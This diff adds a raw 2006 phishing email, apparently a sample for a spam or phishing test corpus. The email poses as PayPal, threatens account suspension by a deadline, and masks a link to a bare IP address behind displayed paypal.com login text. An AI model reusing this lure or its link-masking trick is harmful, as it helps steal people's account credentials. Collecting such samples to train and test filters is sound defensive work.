@@ -1,0 +1,55 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id E02222A88C
+ for <user@example.com>; Mon, 27 Feb 2006 05:13:35 -0500 (EST)
+Received: by mail.example.com (Example mail relay)
+ id D3DD8621CAA; Mon, 27 Feb 2006 05:13:35 -0500 (EST)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id B7866621C9C
+ for <user@example.com>; Mon, 27 Feb 2006 05:13:35 -0500 (EST)
+Received: (from user@localhost) by mail.example.com id FAA18777
+ for user@example.com; Mon, 27 Feb 2006 05:13:35 -0500
+Received: from correio.cral.com.br ([200.213.209.130])
+ by mail.example.com with ESMTP id FAA18769
+ for <user@example.com>; Mon, 27 Feb 2006 05:13:33 -0500
+Received: from secure (unknown [209.42.58.147])
+ by correio.cral.com.br (Postfix) with ESMTP
+ id BCC0ABF8838; Mon, 27 Feb 2006 07:11:20 -0300 (BRT)
+From: "PayPal Inc." <service!@paypal.com>
+Subject: PayPal Confirm Message !
+Date: Mon, 27 Feb 2006 05:14:51 -0500
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+Message-Id: <20060227101120.BCC0ABF8838@correio.cral.com.br>
+To: undisclosed-recipients: ;
+Content-Length: 2938
+Lines: 15
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 318
+
+<P><img src="http://www.mbprofesional.ro/Imagini/logo.gif"></P>
+<P><FONT size=2><FONT face=Verdana>Dear valued&nbsp;<STRONG><STRONG><SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana">PayPal<SUP>®</SUP></SPAN></STRONG>&nbsp;</STRONG>member</FONT> 
+  :&nbsp;<BR>
+  </FONT></P>
+<P><FONT face=Verdana size=2>It has come to our attention that your&nbsp;<SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>®</SUP></STRONG></SPAN> account information needs to be&nbsp;<BR>updated as part of our continuing commitment to protect your account and to&nbsp;<BR>reduce the instance of fraud on our website.&nbsp;</FONT><FONT face=Verdana size=2><FONT face=Verdana size=2> If you could please take 5-10 minutes&nbsp;<BR>out of your </FONT><FONT face=Verdana size=2>online </FONT><FONT face=Verdana size=2>experience and update your personal records you will not run into&nbsp;<BR>any future </FONT><FONT face=Verdana size=2>problems with the online service. </FONT></P>
+<P><FONT face=Verdana size=2>However, failure to update your records will result in account suspension.&nbsp;<BR>
+  Please update your records&nbsp;on or before&nbsp;<FONT color=red><STRONG>March 
+  1, 2006</STRONG>.</FONT>&nbsp;<BR>
+  <BR>Once you have updated your account records, your&nbsp;<SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>®</SUP></STRONG></SPAN> session will not be&nbsp;<BR>interrupted and will continue as normal. </FONT></P>
+<P><FONT face=Verdana size=2>To update your <SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>®</SUP></STRONG></SPAN> records click on the following link:&nbsp;<BR></FONT><BR>
+  <A onclick="return ShowLinkWarning()" href="http://222.110.46.16/usage/index.html" target=_blank><FONT face=Verdana color=#003399 size=2>http://www.paypal.com/cgi-bin/webscr?cmd=login-run</FONT></A> 
+<P><FONT face=Verdana size=2></FONT>&nbsp;</P>
+<P><FONT face=Verdana size=2>Thank You. &nbsp;<BR><SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>PayPal<SUP>® </SUP><SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana">UPDATE </SPAN></STRONG><SPAN style="FONT-SIZE: 10pt; COLOR: black; FONT-FAMILY: Verdana"><STRONG>TEAM</STRONG></SPAN></SPAN> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</P>
+<P><FONT face=Verdana size=2>Accounts Management As outlined in our User Agreement, <SPAN><STRONG>PayPal<SUP>®</SUP></STRONG></SPAN> will&nbsp;<BR>periodically send you information about site changes and enhancements. </FONT></P>
+<P><FONT face=Verdana size=2>Visit our Privacy Policy </FONT><FONT face=Verdana size=2>and User Agreement if you have any questions.&nbsp;<BR></FONT><A href="http://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy-outside" target=_blank><FONT face=Verdana color=#003399 size=2>http://www.paypal.com/cgi-bin/webscr?cmd=p/gen/ua/policy_privacy -outside</FONT></A></P></FONT></FONT>
